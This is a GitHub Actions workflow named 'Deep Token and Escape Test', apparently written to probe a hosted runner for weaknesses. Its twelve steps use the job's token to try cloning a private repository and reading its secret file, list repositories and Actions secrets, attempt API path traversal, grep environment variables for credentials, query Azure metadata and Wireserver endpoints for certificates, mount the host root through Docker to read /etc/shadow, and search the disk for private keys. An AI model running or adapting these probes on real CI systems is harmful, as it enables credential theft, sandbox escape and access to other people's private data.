name: Deep Token and Escape Test

on:
  workflow_dispatch:

jobs:
  deep-test:
    runs-on: ubuntu-latest
    steps:
      - name: Token and Escape Tests
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "=== TEST 1: GITHUB_TOKEN JWT decode ==="
          echo "$GITHUB_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>&1 || echo "not a JWT"
          echo ""
          echo "=== TEST 2: Git clone private repo with GITHUB_TOKEN ==="
          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/test4100test-cloud/private-secret-test.git /tmp/private-clone 2>&1 || echo "BLOCKED"
          if [ -d /tmp/private-clone ]; then
            echo "CLONE SUCCEEDED!"
            ls -la /tmp/private-clone/
            cat /tmp/private-clone/SECRET_DATA.md 2>&1
          fi
          echo ""
          echo "=== TEST 3: Git fetch specific SHA ==="
          git ls-remote https://x-access-token:${GITHUB_TOKEN}@github.com/test4100test-cloud/private-secret-test.git 2>&1 | head -5 || echo "BLOCKED"
          echo ""
          echo "=== TEST 4: GraphQL with GITHUB_TOKEN ==="
          curl -s -H "Authorization: bearer $GITHUB_TOKEN" \
            -X POST https://api.github.com/graphql \
            -d "{"query":"{viewer{login repositories(first:10){nodes{name isPrivate}}}}"}" 2>&1 | head -20
          echo ""
          echo "=== TEST 5: List all repos accessible to token ==="
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/installation/repositories?per_page=100" 2>&1 | head -30
          echo ""
          echo "=== TEST 6: API path traversal ==="
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/repos/test4100test-cloud/sec-test/../private-secret-test/contents/" 2>&1 | head -10
          echo ""
          echo "=== TEST 7: Actions API ==="
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/repos/test4100test-cloud/sec-test/actions/secrets" 2>&1 | head -10
          echo ""
          echo "=== TEST 8: Environment variables ==="
          env | sort | grep -iE "TOKEN|SECRET|KEY|AUTH|PASS|CRED|ACTIONS|GITHUB|RUNNER|AZURE|AWS" | head -30
          echo ""
          echo "=== TEST 9: Hosted Compute Orchestrator with allocation ID ==="
          ALLOC_ID=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); tags=d.get("compute",{}).get("tagsList",[]); [print(t["value"]) for t in tags if "allocation_id" in t.get("name","")]" 2>/dev/null)
          echo "Allocation ID: $ALLOC_ID"
          RO_URL=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); tags=d.get("compute",{}).get("tagsList",[]); [print(t["value"]) for t in tags if "base_ro_url" in t.get("name","")]" 2>/dev/null)
          echo "RO URL: $RO_URL"
          if [ -n "$RO_URL" ] && [ -n "$ALLOC_ID" ]; then
            echo "--- Orchestrator with allocation ---"
            curl -s --connect-timeout 5 "$RO_URL/$ALLOC_ID" 2>&1 | head -10
            curl -s --connect-timeout 5 "$RO_URL/status" 2>&1 | head -10
            curl -s --connect-timeout 5 "$RO_URL/health" 2>&1 | head -10
          fi
          echo ""
          echo "=== TEST 10: Docker container escape ==="
          echo "--- Mount host root into container ---"
          docker run --rm -v /:/hostfs:ro alpine cat /hostfs/etc/shadow 2>&1 | head -5
          echo "--- Runner agent directory ---"
          ls -la /home/runner/actions-runner/ 2>&1 | head -15
          cat /home/runner/actions-runner/.runner 2>&1 || echo "no .runner file"
          echo ""
          echo "=== TEST 11: Scan for private SSH keys ==="
          find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "id_ecdsa" 2>/dev/null | head -10
          echo ""
          echo "=== TEST 12: Access Azure Wireserver for certificates ==="
          curl -s --connect-timeout 3 "http://168.63.129.16/machine/Plugins/?comp=config&type=hostingEnvironmentConfig&incarnation=1" -H "x-ms-version: 2012-11-30" 2>&1 | head -20
          curl -s --connect-timeout 3 "http://168.63.129.16:32526/status" 2>&1 | head -10
          echo ""
          echo "=== Complete ==="
